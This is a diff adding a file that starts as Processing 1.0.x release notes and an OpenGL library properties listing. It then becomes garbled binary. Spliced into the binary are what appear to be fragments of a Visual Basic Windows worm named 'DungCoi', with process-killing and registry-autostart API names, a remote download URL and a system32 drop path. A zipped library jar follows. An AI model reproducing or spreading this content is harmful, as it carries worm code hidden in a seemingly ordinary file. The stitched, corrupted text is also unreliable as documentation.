@@ -1,0 +1,762 @@
+or Mac OS X Snow Leopard. 
+
+[ changes ] 
+
++ Tweaks for Mac OS X Snow Leopard, to force it to run in 32-bit mode.
+  This should bring back the video library (if temporarily), and hopefully
+  fix serial as well, though I didn't have a serial device handy to test. 
+
++ Fix problem where line highlighting was off in 'static' mode.
+  http://dev.processing.org/bugs/show_bug.cgi?id=1263
+
++ Auto-format was killing Unicode characters (how did this last so long?)
+  http://dev.processing.org/bugs/show_bug.cgi?id=1312
+
++ PVector.angleDistance() returning NaN due to precision errors
+  http://dev.processing.org/bugs/show_bug.cgi?id=1316
+
++ Removed a major try/catch block from PApplet.main(), hopefully 
+  this will allow some exception stuff to come through properly.
+
+
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+
+PROCESSING 1.0.6 (REV 0168) - 12 August 2009
+
+Bug fixes and minor changes. Most important are replacement JOGL libraries
+so that OpenGL applets won't present an "expired certificate" error.
+
+[ bug fixes ] 
+
++ Replaced the faulty JOGL library that had expired certificates (Sun bug).
+  http://dev.processing.org/bugs/show_bug.cgi?id=1271
+  https://jogl.dev.java.net/servlets/ProjectDocumentList?folderID=9260&expandFolder=9260&folderID=0
+
++ Updated the Linux launcher script that enables Processing to be run
+  from other directories, symlinks, or from launch items.
+  http://dev.processing.org/bugs/show_bug.cgi?id=825
+  Thanks to Ferdinand Kasper for the fix!
+
++ strokeWeight() was making lines 2x too thick with P2D
+  http://dev.processing.org/bugs/show_bug.cgi?id=1283
+
++ PImage.getImage() setting the wrong image type
+  http://dev.processing.org/bugs/show_bug.cgi?id=1282
+
++ image() not working with P2D, P3D, and OPENGL when noFill() used
+  http://dev.processing.org/bugs/show_bug.cgi?id=1299
+  http://dev.processing.org/bugs/show_bug.cgi?id=1222
+
++ Auto format problem with program deeper then 10 levels
+  http://dev.processing.org/bugs/show_bug.cgi?id=1297
+
++ Fixed a crash on startup problem (console being null)
+
++ Recursive subfolder copy of library folders when exporting application
+  http://dev.processing.org/bugs/show_bug.cgi?id=1295
+
+[ changes ]
+
++ PDF member functions set protected instead of private
+  http://dev.processing.org/bugs/show_bug.cgi?id=1276
+
++ On OS X, update Info.plist to be 32/64 explicit and also updated 
+  JavaApplicationStub for update 4.
+
++ Clicking the preferences location in the Preferences window will 
+  now open the parent folder for the preferences file. 
+  http://dev.processing.org/bugs/show_bug.cgi?id=1279
+
++ Update to Java 6 update 15 for the Windows and Linux releases.
+
+[ fixed earlier ] 
+
++ Mangled menu text with Java 6u10.
+  http://dev.processing.org/bugs/show_bug.cgi?id=1065
+
+
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+
+PROCESSING 1.0.5 (REV 0167) - 7 June 2009
+
+Bug fix release, mostly dealing with regressions from 1.0.4.
+
+[ bug fixes ] 
+
++ Make the tab key work again inside the editor
+  http://dev.processing.org/bugs/show_bug.cgi?id=1267
+
++ Deal with duplicate entries for sketchbook in the file menu
+  http://dev.processing.org/bugs/show_bug.cgi?id=1260
+
+[ changes ]
+
++ Support for smooth text in the PDE editor. Set editor.antialias=true
+  inside preferences.txt to enable smooth text.
+  http://dev.processing.org/bugs/show_bug.cgi?id=1266
+
++ Updated reference files.
+
+
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+
+PROCESSING 1.0.4 (REV 0166) - 31 May 2009
+
+Bug fix release. 
+
+[ changes ] 
+
++ Changed the workaround for Apple's Java bug related to the menus in OS X.
+  Rather than placing the menubar inside the sketch window, File > Sketchbook
+  and File > Examples are simply dimmed out. Instead, use the Open button
+  on the toolbar, which provides access to the same items. The preference
+  to place the menu bar inside the window is still available, in case you 
+  prefer the previous workaround.
+  http://dev.processing.org/bugs/show_bug.cgi?id=786
+
++ Also updated the included runtime on Windows and Linux to Java 6u14.
+
+[ bug fixes ]
+
++ Fixed IDE crash when changing color scheme on windows 
+  http://dev.processing.org/bugs/show_bug.cgi?id=1237
+
++ Typo in the Linux shell script was preventing it from running
+  http://dev.processing.org/bugs/show_bug.cgi?id=1250
+
++ OS X finder info on application updated to say 1.0.4
+  http://dev.processing.org/bugs/show_bug.cgi?id=1226
+
++ Removed warning message "Non-String for 8 value in 'Properties' 
+  sub-dictionary in 'Java' sub-dictionary of Info.plist" on OS X
+
++ Added warning to build script for users on OS X 10.4
+  http://dev.processing.org/bugs/show_bug.cgi?id=1179
+
++ Disable point() going to set() from PGraphicsJava2D. The set() command 
+  doesn't honor alpha consistently, and it also causes problems with PDF
+
++ PImage cacheMap problem when using PImage.get() 
+  http://dev.processing.org/bugs/show_bug.cgi?id=1245
+
++ Fix problems with > 512 points and P3D/OPENGL
+  http://dev.processing.org/bugs/show_bug.cgi?id=1255
+  Thanks to user DopeShow for the patch
+
++ imageMode(CENTER) doesn't work properly with P2D
+  http://dev.processing.org/bugs/show_bug.cgi?id=1232
+
++ Reset matrices when using beginRecord() with PDF
+  http://dev.processing.org/bugs/show_bug.cgi?id=1227
+
++ Resizing window no longer distorts OpenGL graphics
+  http://dev.processing.org/bugs/show_bug.cgi?id=1176
+  Many thanks to Pablo Funes for the patch
+
++ Fix significant point() and set() slowdown on OS X
+  http://dev.processing.org/bugs/show_bug.cgi?id=1094
+
+[ known issues ] 
+
++ Currently no 64-bit support for any platforms. On some platforms, you'll 
+  simply need to replace the Java folder with the distribution with something
+  more suitable for your operating system. 
+
++ Command line support is currently broken
+  http://dev.processing.org/bugs/show_bug.cgi?id=1048
+
++ Text of menus/interface elements sometimes mangled (e.g. toolbar repeats
+  several times, other oddness). See bug report for a workaround
+  http://dev.processing.org/bugs/show_bug.cgi?id=1065
+
++ Video library threading problems with other libraries
+  http://dev.processing.org/bugs/show_bug.cgi?id=882
+
++ See dev.processing.org/bugs for much, much more!
+
+
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+
+PROCESSING 1.0.3 (REV 0165) - 24 February 2009
+
+Bug fix release to repair a couple of regressions caused by changes in 1.0.2, 
+as well as a couple other new problems encountered since.
+
+[ bug fixes ]
+
++ endRecord or endRaw produces a RuntimeException with the PDF library
+  http://dev.processing.org/bugs/show_bug.cgi?id=1169
+
++ Problem with beginRaw/endRaw and OpenGL
+  http://dev.processing.org/bugs/show_bug.cgi?id=1171
+
++ Set strokeWeight on points and lines with begin/endRaw
+  http://dev.processing.org/bugs/show_bug.cgi?id=1172
+
++ Fix strokeWeight quirks with P3D when used with points and lines
+
++ ArrayIndexOutOfBoundsException with point()
+  http://dev.processing.org/bugs/show_bug.cgi?id=1168
+
+[ changes ] 
+
++ Update to iText 2.1.4 for the PDF library
+
+
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+
+PROCESSING 1.0.2 (REV 0164) - 21 February 2009
+
+This release fixes many bugs and adds two minor functions to the XML library.
+
+[ bug fixes ] 
+
++ Empty "code" folder causing problems with Export
+  http://dev.processing.org/bugs/show_bug.cgi?id=1084
+
++ Sketches not loading when .pde file is opened from the Windows Explorer 
+  on Asian Windows systems. 
+  http://dev.processing.org/bugs/show_bug.cgi?id=1089
+
++ Disable copying of metadata and resource forks in OS X build
+  http://dev.processing.org/bugs/show_bug.cgi?id=1098
+
++ Suppress goofy Apple error message about JVMArchs 
+
++ StringIndexOutOfBoundsException caused by import statements with no dots
+  http://dev.processing.org/bugs/show_bug.cgi?id=1145
+
++ Pressing <Esc> in "Are you sure you want to Quit?" dialog causes quit
+  http://dev.processing.org/bugs/show_bug.cgi?id=1134
+
++ Fix QUADS and QUAD_STRIP with P2D
+  http://dev.processing.org/bugs/show_bug.cgi?id=1162
+
++ ArrayIndexOutOfBoundsException when drawing curves in P3D and OPENGL
+  http://dev.processing.org/bugs/show_bug.cgi?id=1153
+
++ Problems with negatve arc() angles in OpenGL, P3D, other inconsistencies
+  http://dev.processing.org/bugs/show_bug.cgi?id=1095
+
++ requestImage() causing problems with JAVA2D
+
++ Fix minor strokeWeight bug with OpenGL
+
++ Minor bug fix to SVG files that weren't being resized properly
+
++ OpenGL is rendering darker in 0149+
+  http://dev.processing.org/bugs/show_bug.cgi?id=958
+  Thanks to Dave Bollinger for tracking this down and providing a solution
+
++ OutOfMemoryError with ellipse() in P3D and OPENGL
+  http://dev.processing.org/bugs/show_bug.cgi?id=1086
+
++ ArrayIndexOutOfBoundsException with P3D and OPENGL
+  http://dev.processing.org/bugs/show_bug.cgi?id=1117
+
++ point(x,y) ignores noStroke() in some renderers
+  http://dev.processing.org/bugs/show_bug.cgi?id=1090
+
++ Fix Windows startup problem when scheme coloring was odd
+  http://dev.processing.org/bugs/show_bug.cgi?id=1109
+  Changes to the system theme could cause Processing to not launch
+
++ Fix several point() problems with P3D
+  http://dev.processing.org/bugs/show_bug.cgi?id=1110
+
++ nextPage() not working properly with PDF as the renderer
+  http://dev.processing.org/bugs/show_bug.cgi?id=1131
+
++ Save style information when nextPage() is called in PDF renderer
+
++ beginRaw() broken (no DXF, etc working)
+  http://dev.processing.org/bugs/show_bug.cgi?id=1099
+  http://dev.processing.org/bugs/show_bug.cgi?id=1144
+
++ Fix algorithm for quadratic to cubic curve conversion 
+  http://dev.processing.org/bugs/show_bug.cgi?id=1122
+  Thanks to user bits.in.shambles for providing a fix.
+
++ tint() not working in P2D
+  http://dev.processing.org/bugs/show_bug.cgi?id=1132
+
++ blend() y coordinates inverted when using OpenGL
+  http://dev.processing.org/bugs/show_bug.cgi?id=1137
+
++ Fix for getChild() and getChildren() with XML elements that have null names
+
+[ additions ] 
+
++ Added listChildren() method to XMLElement
+
++ Added optional toString(boolean) parameter to enable/disable indents
+  in XMLElement
+
+
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+
+PROCESSING 1.0.1 (REV 0163) - 29 November 2008
+
+Processing 1.0 has arrived! You can read an overview of changes introduced
+in the last few months here: http://processing.org/reference/changes.html
+
+Also see the "known issues" section of the troubleshooting page:
+http://processing.org/reference/troubleshooting/#known
+
+This release (1.0.1) fixes a handful of issues that only showed up once we 
+had more testing, particularly with the wider audience we've received in the
+past week following the announcement.
+
+[ bug fixes ] 
+
++ ArrayIndexOutOfBoundsException with File > New
+  http://dev.processing.org/bugs/show_bug.cgi?id=1067
+
++ "CallStaticVoidMethod() threw an exception" on some Mac OS X machines
+  http://dev.processing.org/bugs/show_bug.cgi?id=1063
+  http://dev.processing.org/bugs/show_bug.cgi?id=1078
+
++ "editor.indent" preference setting does not work properly
+  http://dev.processing.org/bugs/show_bug.cgi?id=1073
+
++ Fixed some "An error occurred while starting the application" problems
+
++ Added a note about the Minim library to the changes page.
+
++ Disable parsing of regexps with the split() command
+  http://dev.processing.org/bugs/show_bug.cgi?id=1060
+
++ Fixed ArrayIndexOutOfBoundsException in ellipseImpl().
+  http://dev.processing.org/bugs/show_bug.cgi?id=1068
+
++ Fixed problem where small ellipses weren't showing up.
+
+[ changes ] 
+
++ Implement multi-line tab via tab key (also outdent)
+  http://dev.processing.org/bugs/show_bug.cgi?id=1075
+
++ Code with 'import' and a space incorrectly parsed as an import statement
+  http://dev.processing.org/bugs/show_bug.cgi?id=1064
+
+
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+
+PROCESSING 1.0 (REV 0162) - 24 November 2008
+
+Processing 1.0 has arrived! You can read an overview of changes introduced
+in the last few months here: http://processing.org/reference/changes.html
+
+[ known issues ] 
+
++ Sketches that size(w, h, OPENGL) and do not clear the background on each 
+  frame can cause major flickering or problems when the screen clears anyway.
+  There are several possible solutions:
+
+  1. You may need to disable the default 2x smoothing by using
+     hint(DISABLE_OPENGL_2X_SMOOTH).
+  
+  2. Update the drivers for your graphics card.
+
+  3. Get a decent graphics card -- the OpenGL renderer is for advanced
+     use, we don't support using it with cheaper built-in graphics hardware 
+     like the Intel GMA 950. 
+
+  4. If you're running Windows Vista, try disabling the Aero theme. 
+
+  This flickering issue is being tracked here:
+  http://dev.processing.org/bugs/show_bug.cgi?id=1056
+
++ "An error occurred while starting the application" when launching
+  Processing.exe on Windows. This is a high priority however we cannot
+  reproduce it on any of our test machines, which has delayed a fix.
+  http://dev.processing.org/bugs/show_bug.cgi?id=986
+
++ With P2D, P3D, and OPENGL, series of connected lines (such as the stroke 
+  around a polygon, triangle, or ellipse) produce unattractive results when 
+  strokeWeight is set.
+  http://dev.processing.org/bugs/show_bug.cgi?id=955
+
++ Unlike most applications, the menu bar is inside the editor window when
+  Processing is used with Mac OS X 10.5. This is a workaround for an Apple 
+  bug in Java 1.5 and 1.6 on Mac OS X 10.5 that causes the menu bar to be 
+  so excessively slow that the application appears to have crashed.
+  http://dev.processing.org/bugs/show_bug.cgi?id=786
+
+  Please file a bug report with Apple at bugreporter.apple.com if you want
+  this fixed. The problem has existed since the spring, and we first filed 
+  a bug  with them in June, and we have received no indication that it when 
+  it will be fixed, or if it will ever be fixed.
+
+  Or if you want to take your chances with the slow menu bar, 
+  you can change the default setting in the Preferences window.
+
++ Sketches that use the video library plus OpenGL have a problem on some
+  OS X machines. The workaround is listed in Comment #16 of this bug:
+  http://dev.processing.org/bugs/show_bug.cgi?id=882#c16
+
++ Command line support arrived in a recent release, but is not working yet.
+  http://dev.processing.org/bugs/show_bug.cgi?id=1048
+
++ OpenGL rendering is more dim/darker in release 0149 and later.
+  http://dev.processing.org/bugs/show_bug.cgi?id=958
+  Any help tracking this down would be most appreciated.
+
++ The first few frames of OpenGL sketches on Windows run slowly.
+  http://dev.processing.org/bugs/show_bug.cgi?id=874
+
++ When used with P3D, strokeWeight does not interpolate the Z-coordinates 
+  of the lines, which means that when rotated, these flat lines may 
+  disappear. (Since, uh, lines are, you know, flat.) The OPENGL renderer 
+  setting does not share this problem because it always draws lines 
+  perpendicular to the screen (which we hope to do in a future release).
+  http://dev.processing.org/bugs/show_bug.cgi?id=956
+
+
+. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
+
+
+in spite of their historical feel good campiness, i've removed the
+notes from earlier releases because this file was getting out of hand. 
+                                                                                                                                   @  Ô   \F@           pA@ °¿ $G@   @  Ø   \F@           ´A@ °¿ (G@   @  Ü   ,G@ ÿÿÿÿ        øA@ à¿ <G@ ÿÿÿÿ@  à   G@           ŒB@ Ğ¿ DG@   @  ä   G@           ¨B@ Ğ¿ LG@   @  è   G@           ÄB@ Ğ¿ TG@   çB@ ûB@ C@ #C@ 7C@ KC@ _C@ sC@ ‡C@ ›C@ ¯C@     è<@ T;@ â@ è@ î@                                                 =@ T;@ â@ è@ î@                                                 8=@ T;@ â@ è@ î@                                                                     # If you want to support more platforms, visit jogamp.org to get the 
+# natives libraries for the platform in question (i.e. Solaris). 
+
+name = OpenGL
+
+application.macosx=core.jar,jogl-all.jar,gluegen-rt.jar,jogl-all-natives-macosx-universal.jar,gluegen-rt-natives-macosx-universal.jar
+application.windows32=core.jar,jogl-all.jar,gluegen-rt.jar,jogl-all-natives-windows-i586.jar,gluegen-rt-natives-windows-i586.jar
+application.windows64=core.jar,jogl-all.jar,gluegen-rt.jar,jogl-all-natives-windows-amd64.jar,gluegen-rt-natives-windows-amd64.jar
+application.linux32=core.jar,jogl-all.jar,gluegen-rt.jar,jogl-all-natives-linux-i586.jar,gluegen-rt-natives-linux-i586.jar
+application.linux64=core.jar,jogl-all.jar,gluegen-rt.jar,jogl-all-natives-linux-amd64.jar,gluegen-rt-natives-linux-amd64.jar
+application.linux-armv6hf=core.jar,jogl-all.jar,gluegen-rt.jar,jogl-all-natives-linux-armv6hf.jar,gluegen-rt-natives-linux-armv6hf.jar                                                                                                	  	         T;@ ÿÿÿÿ\G@             @E@     E@ ÿÿ  ƒ€     ¬4@ ÿÿÿÿ L@     @À@     HE@ 
+       ÿÿ  €     Ø1@ ÿÿÿÿJ@     À@     PE@ 	       ÿÿ  €     ¸8@ ÿÿÿÿÔQ@             XE@    ,E@ ÿÿ        à2@ ÿÿÿÿ L@     0À@     \E@        ÿÿ  €       >\úFÌûLú
+  LúDúHú $  	 HúX 
+  Q@ Äùõ.   ¬Q@   Form1   Yahoo   Process DL  Start   dungcoi    I d     <   I   a m   D u n g C o i   b y   D u n g C o i D a k N o n g     Z   S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ R u n   zÎ—5\ÒgE¡3+œ;4îÌ"±s\tD¯RcïëÖ¬‚Ñ®¡°E¿L7rìBª¤¿ÁWVâA‡µGœĞ3i½²0,—c¾A£î:T>Ã±7DL4 DL3 O­3™fÏ· ª `Ó“l2  .=ûüú h§8 +3qµ    C:\Program Files\Microsoft Visual Studio\VB98\VB6.OLB   VB  ˆF@        	   œF@ ÔF@ `Ä@         ˜š l3  *O­3™fÏ· ª `Ó“Timer4  l1  l   DL1 DL2 :O­3™fÏ· ª `Ó“Form    Timer1  Timer2  Timer3  ` ô        4  8  <  @  D  H  L  P  T  X  \  `  d  h  l  x  ˆ     ¤  ¨  ¬  O­3™fÏ· ª `Ó“ ,   (4$ 
+   $   	   kernel32       CreateToolhelp32Snapshot    èG@ øG@    dÄ@         ¡lÄ@ ÀtÿàhH@ ¸p@ ÿĞÿà      Process32First  èG@ LH@    pÄ@         ¡xÄ@ Àtÿàh\H@ ¸p@ ÿĞÿà      Process32Next   èG@ ”H@    |Ä@         ¡„Ä@ Àtÿàh¤H@ ¸p@ ÿĞÿà      TerminateProcess    èG@ ÜH@    ˆÄ@         ¡Ä@ ÀtÿàhğH@ ¸p@ ÿĞÿà      OpenProcess èG@ (I@    ”Ä@         ¡œÄ@ Àtÿàh4I@ ¸p@ ÿĞÿà      CloseHandle èG@ lI@     Ä@         ¡¨Ä@ ÀtÿàhxI@ ¸p@ ÿĞÿà      wininet.dll    InternetGetConnectedStateEx °I@ ÀI@    ¬Ä@         ¡´Ä@ ÀtÿàhÜI@ ¸p@ ÿĞÿà                    $ ÿ   #=ûüú h§8 +3qµ"=ûüú h§8 +3qµ   ,J@ <J@     yO­3™fÏ· ª `Ó“   \      advapi32.dll       RegCloseKey xJ@ ŒJ@    ¸Ä@         ¡ÀÄ@ Àtÿàh˜J@ ¸p@ ÿĞÿà      RegCreateKeyA   xJ@ ĞJ@    ÄÄ@         ¡ÌÄ@ ÀtÿàhàJ@ ¸p@ ÿĞÿà      RegSetValueExA  xJ@ K@    ĞÄ@         ¡ØÄ@ Àtÿàh(K@ ¸p@ ÿĞÿà      WritePrivateProfileStringA  èG@ `K@    ÜÄ@         ¡äÄ@ Àtÿàh|K@ ¸p@ ÿĞÿà      GetWindowsDirectoryA    èG@ ´K@    èÄ@         ¡ğÄ@ ÀtÿàhÌK@ ¸p@ ÿĞÿà             "   \ s y s t e m 3 2 \ N W B . d a t   P   h t t p : / / d u n g c o i v b . g o o g l e p a g e s . c o m / N W B . t x t     E n u m K e y      \ \     C o p y F i l e     VBA6.DLL    ,J@ ôÄ@    FindWindowExA   w«Ï Fµ/dk+şHr       F U N      D C        S V I Q                user32     FindWindowA ,M@ 8M@    øÄ@         ¡ Å@ ÀtÿàhDM@ ¸p@ ÿĞÿà   P­3™fÏ· ª `Ó“,M@ ÔL@    Å@         ¡Å@ ÀtÿàhˆM@ ¸p@ ÿĞÿà      SendMessageA    ,M@ ÀM@    Å@         ¡Å@ ÀtÿàhĞM@ ¸p@ ÿĞÿà      shell32.dll    ShellExecuteA   N@ N@    Å@         ¡$Å@ Àtÿàh(N@ ¸p@ ÿĞÿà      C : \ P N g a . t x t   d   C h u c   m u n g ,   b a n   d a   t a m   t h o i   t h o a t   k h o i   W o r m   D u n g C o i        C h u c   m u n g      i m c l a s s   ãÃn:ùDŒ9?D?„k    4   S c r i p t i n g . F i l e S y s t e m O b j e c t     D r i v e s     D r i v e T y p e      A   G e t F o l d e r   s u b f o l d e r s     P a t h     N a m e        d u n g c o i _ v b     r   O l a l a l a , PK
+   Â2IGŸìP}  ô     META-INF/MANIFEST.MF’IOÃ0…ï‘ò|$»v ´É­E¨*b®Èq¦©‘7ÙË¿ÇeK!8ú½ofí¹àF®!D|>Hk*ÄÍ³™ÙQf‹ ¤%³$GyvâGhğüuËO	}8¦¸.&hïÊs¡ Xï¬ç1Õï§nÎ))ŞOø’k¨ĞBu° ƒn:ƒWRCİ:rıE­dT;Øâh.M#MPR õ¶şwÕwâ‚=ÓX_¡3ÛÎ´KµîŒŒ¯y¶ÔNÿİ'üÅí#ÅÀwR5ï&®KJqAÙ˜QZAÏØTÈzÙJ3Ò<Dğj›WÆ
+	Á ¬Åq9­'kÆh9IcG´˜Àøl<.ÖÅ”ş÷Ÿ÷ÿ ñ2…V“GÛríÔİÍy…61ºj4ú@ˆõí(ÏN_"˜Ğÿô§iRÙDŞ’ÔT[“g+ß…íËÚsŸ)ú.½ò5x-Ã¶A¨W
+»^ø¹IŸ…x¦”}æµ‚ôHÔ<¤©iGûéæY½PK
+   Ã2IGf¬   š   -   jogamp/nativetag/common/linux/amd64/TAG.class;õo×>#..fvvvNF6›Ì¼Ì;FfÍ0Fçü”TVFõ¬üôÄÜı¼Ä’Ì²Ô’ÄtıäüÜÜü<ıœÌ¼Ò
+ıÄÜ3ıGwF¬Ä²DıœÄ¼t}ÿ¤¬ÔäC& - À„@ã€$'æ30°jmg`ÜVÀ  PK
+   Ã2IG‰­Eñf   &  $   natives/linux-amd64/libgluegen-rt.soÅZPÕÇ7† V“Â–‰JÔœ$!Ôbp°I!ÁbÔ&×ån6{¸·‡i¦hRÇ+¥M­Ö8[[ëØ'µí42Ijğ+A“ÚÚ5±GLG¬hĞ¦¹şßîÿq{î N³üîÿùşÿ÷±oßÛı£¶:Éf#¬$“[¥ºrMºù‚0®¼R’ÿù†n*‰__‹àÉøOíÒà
+!?´HˆÁo%™ü–¤X»$´D»AÔgÂTf u
+^{Ïãb‹)ˆõgt7ı]šgÒ<&±Èìn»4ré%×b%¡ı@HÍúFòPÇ¼õOôıå×gığbçúŞäú·ÿöÕ»®Ù¨oä˜a#¶rÉÓBUy(«KX,Ôd‘¼Ì4ò½ùå×¯H£ºÙXõá“…pÑ¦àú\…ØWYb»®%pJrì8{â£ì¿ß›wİÀ^>é¹vôêü}%Ïõ|œıö©UŸn¿ëpòàİ[]şê…£Õ×÷¾ÿão_'<³ğÄèá¤
+ÇŸÎÕî|àë­¸~¯³ïÆo{+?¸ò£sÛÎ×Î»§ù“g(í­ıÉÉûŞışîûN¿öğèŞ³ûF÷n|²àƒ¿xşµDm—L2IN,o…-Ú¦ÖÂråËVè¬¯LÂ•LîÇÇO$¾'N<çm“×+Åñ_‡¿‘˜}Ç—ı©Ôÿ,rË“¾ùs	åg‘Ñ¹±ú—%›ú]WÆê¿‰üç8şí)&ÿ¿ë½«7×¨wbõ ÿ'9?Ei&/úÙŒüpõ5±­q4ÉÔoåüœÆxnE?ÈE?EœŸİèçÎO€`û\nÒÿ®ágî„xÒmØşØÉï!ÿl·T®}öc¾ùØ/'‘?õ_ãâ¹	ıÈ8ƒü5§ÿ3ôóOŸí“ÇÅ³ãFşJäG°ŞÎÏ	lŸóØ>5È÷¢~*§ÿì÷½ÿ·¨Ÿ‡|¶|ìGÿÇÑò‰ÓÙÜêS~]Òt§“8UÑ‰Ó@œkêœnY“›¿.ku•^Ÿ*7HM^Ù”M.qº:$ê@ò*;€\×îÜˆz•^Éï—ıdÔ.9·ûš¥Ö6§Ë×JëßŞŞê\·¹®QW¼FŠi=‰¦ÏïlT•ªNUjU\µŠz—¬­mmó:İ^—×çŸª¬i>mŠ6¾6Y¢‰¿³5EäjQT¹JÒ¥µªÇ·1 êJ«ìl–õzŸ¢B«m‚†X«Vtê²Ÿ:›º©Yæ}ø;ı.Ÿê™²¯5^¥Ym•U}­ª—N+«‡e«fìbÅò»XU2c3sPëS›gæGÊÌœT{}Ò3©òà0óÖ˜:Ò7x¦Û'¦õ´;Ä4Ÿ~Cšö3Î~²&kÎ‘ªøœ8p*¬QUŠ&»t“^ãvk²ßŸÈSï•tOkuºšı× ¡Ô)^¯â'àæó¸¥Î){pi><£ ]&ÖIš±\x”õ’®´ËµJÓ]×”&?ñ*M.»ßg_Eœ²š	V¥&¿ß\å€¥ºIMíÚŠJçrûr;[š‰¹K²şJ‚çÕ™üãÿ©´è3l`’Iı~›¶ocû­z\Ÿû9~.òó
+bùŒ~$ßDê69šyÜÂ·î«²ğ/³ğXø³,üƒ~–…?ˆütbm=B†,ü?lá[÷¿#¾5Î1?İÂ'Q~†…aágZø¹¾5~q×¹±;õõlˆßé©áMóHÆaS"+ß•ÈU'áNA9ü¢tE \õ
+¥i—ô!JÓ&t/¥i×0èg)M›føqƒ~šÒ´I†÷ôÏ)M›b¸Ë ¥4¸H±§ì§4æT
+â’11xFÜ5–İ>Òùl¶™NæÖÈ'§ 
+öi‡=´Øs
+v›y÷”İnØ¯ÜhÚ_¤ö}“ÅàˆØ^-Ú^ß¸¨ç³>t–e:3íy]e™à‡®w•=à2xFÏ»ËÎ.ƒÃ"üÛúRê0lŸLŒ§sÔ³k5	ÌŞšfÜPÿXÿ0uØ:\ÒF#İsÅbpgX†Ä`ã xÔ1föéÎA¢Šİ°ØºŠÓ©£ºA±»”‰ÁS‘1èÅ1’óPèåÃ“ºëvŠÁ£áe#‘ ãB·ãÂ¸ÀôÂ% wH?Hëÿ0?ZuiªQõ˜µjÓÍ&ğS
+~  DÓØ¬;„1ƒ~¢LP@o¢á-ĞO“é5ƒÇTÂ &ÊqÕ-mã?Ë‹¡òAèi1…¹÷Ò9Â:9aÆ¾º»ñ?øÍ}Î¿ô†ÌH
+¢‘Ô‘@NH7Õ<RzçÖÉ3ƒu!KŠ!3ÅĞd)†¦—¢œ<!ÅCÉ|Šk@Òovˆ‘d×…ñ$Cñ’ÅKòƒ©9˜aÌ
+ ¹Œıb>°Ãv¨áåXu[T±’&²R&²2¦«5mÃÜ/7®\kÃ	ŒãÅìq]€‹™ÈĞ!cl6}˜jôêÄ¹)ö8F^0GĞÑğ7¿€>îvŒˆÊH8§dïñó›Şÿå¾#`Ñ/?+ö}‘Nõ­—ƒ¢mä¿xM÷:P^‘CŒ@mñæ7ùG§¿¼9¾Ø6a,³ñ`é¥Mç];O“œC8Øq­Ä¥q;<˜İà•Ôæ6ô:¹Õ§u:Œ½´Qª%Å+»İ'ÀC ĞØP½´TpµHš_€'=AÒšôY_(„_Å…‚¢
+ªñ'¸›¤»ZdÍP,47Û…Sñ·,±?Ø‰şïâ÷ÀV_NT¡Ûå	Lé9£maòÍ´ûéùñÁó‘}H?DŠ _¤Ott= < øú¿"‘AÀ!À1À€ypÓÈ»K)`!àÀ•€€"à#€wÒ›‹
+8x/ààƒ€y0~Eí{©=àëÔpˆÚ~BíÓ`1œ8x'`Ìñß –~ ¸öğø‰Øvl$¶\ÛÂ¬ôúÎ€‘Ó3©ŸE"{¨BvnuvŞºœY÷dt‘Õn¾vÅbã8–êÀòOòÆ"ã¬pMvîıI•³Ó’Ö'Sî†«äEV¹Ërúd±ä51ö†ãpµƒü=«Ü±+9iĞôAÕ£‡èÅĞ'gx½¿Fõh}£pıô®°ê­Æs%í;/²Êo‹ÊK@şvûO ×A~(üAÿ>üw *ü$È÷%‚ü‰ò§c/¼äz¢üAŞœ(ß‘(×%Êäå‰òùŠDùƒüêDùÓ¹ò
+«|§%ßòÍ1ãõÖññŞ ò»A¾Ò*o3íé8ÕA~?ÈOòãô•è8e…í3Ù¾’öFónÂØ^‰½w˜4{ÿ1i¶]ˆ4«o³Gù"NşéÅˆâA¬˜í	û±~¶|
+7—l¯šŠ›A¶GeïåØŞ7„ûF¶'!²ûÛKÎcñäÄòÅìØ8™=ÛS²úàñßˆ¿õ#H³vAú6ÜçH[÷èÿÂŞûò%*æ"^¸
+±q3¢±‘GÔTVŞ$UÉMŠ¤
+%öíË—.+^bş"Äîoñëš.5»êÓe{³°7¯{©â&Õ"ù[ˆİİ©ÒƒsuÍ”´Ëš_ñ©1„dšì•¨"şjóêÄn¼Ì°ërü7^iØ5Ÿqd—[œ–ng‹[‹R¦…SÒ4©Ó´`¿·»4#z°UûtãŸY‹é±Éï'vz>Ï3ï:®­g*ñŞ»³’ÂÑtÛK¬Ù³ùÅpùlò÷‡"ŒÙ³ùÇPH‰Ö›d±gó¢}3{6Ÿ¦ÆæDç+ô}mÄ?›?·pñ'qè æÜd4›ŸßF&æß`Év?`âêçóß†öì})»¿0´Ú_6‰}‰~ëA»ÿ2d÷UVøşwqö#9±¸‡ÓÏåPåìÙw-5î#ş½ÎÙ³õ‚a&§ÏÇ¿íÇÏçÅâ*nÀğıwgïû“xõïáì…ù±øwçë”˜ßŒ¯GãßéL®ÏÓOÂ•c±gëgÿ%Ú?‹ñ3û´¸Dû?Ø³äè÷B&Í¾bí6~NâêgçÓä›ôøûgÎá9{¶‡Ğ~‰-¼ı1Î­Ky±z¼=+'‘ÇìÙ÷	B{şşõgäs|fÿÕ8öVœì¡íßãø|ıÿPK
+   Â2IGŸìP}  ô             ¤    META-INF/MANIFEST.MFPK
+   Ã2IGf¬   š   -           ¤¯  jogamp/nativetag/common/linux/amd64/TAG.classPK
+   Ã2IG‰­Eñf   &  $           ¤ˆ  natives/linux-amd64/libgluegen-rt.soPK      ï   0                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Xlhÿl üXldÿäpzÿ2 tÿpÿlÿhÿà2@   d $                                 tÿ pÿ lÿ hÿ     ¼C@ ÿÿÿÿ     Z@             ÿÿÿÿ        \F@ (Å@ ØF@ tF@ ,Å@ ØF@ G@ 0Å@ ØF@ ,G@ 4Å@ ØF@ xM@ 8Å@ ØF@ ˆQ@ <Å@ sWWWFile    sDestination    sID DownLoadedBytes TotalBytes  Bytes   lÿü"Ydÿ€ hÿ4lhÿ€ 
